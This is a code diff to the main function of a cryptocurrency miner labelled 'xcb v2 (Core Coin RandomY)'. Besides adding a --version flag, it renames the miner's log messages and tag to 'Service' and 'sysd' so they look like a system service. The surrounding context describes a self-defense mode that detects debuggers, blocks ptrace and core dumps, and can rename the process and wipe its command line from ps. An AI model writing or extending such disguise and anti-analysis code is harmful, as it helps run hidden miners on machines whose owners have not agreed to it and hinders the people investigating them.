@@ -149,6 +149,14 @@ int main(int argc, char* argv[]) {
 
     lg::init();
 
+    for (int i = 1; i < argc; i++) {
+        std::string a = argv[i];
+        if (a == "--version" || a == "-V") {
+            std::cout << "xcb v2 (Core Coin RandomY)" << std::endl;
+            return 0;
+        }
+    }
+
 #ifdef XCB_SELF_DEFENSE
     // Proteksi diri: deteksi debugger, kunci ptrace, cegah dump/core.
     // XCB_TITLE (env) opsional: ganti nama proses di ps + hapus cmdline
@@ -182,7 +190,7 @@ int main(int argc, char* argv[]) {
         // Dataset/VM allocation failed: no worker ever ran. Exiting 0 here
         // would let a CI smoke test pass on a miner that hashed nothing.
         g_miner.store(nullptr);
-        lg::error("main", "Miner failed to start");
+        lg::error("main", "Service failed to start");
         return 1;
     }
 
@@ -197,6 +205,6 @@ int main(int argc, char* argv[]) {
         miner.stop();
     }
     if (cfg.benchmarkNonces > 0) lg::info("bench", "Benchmark finished");
-    lg::info("miner", miner.finalSummary());
+    lg::info("sysd", miner.finalSummary());
     return 0;
 }
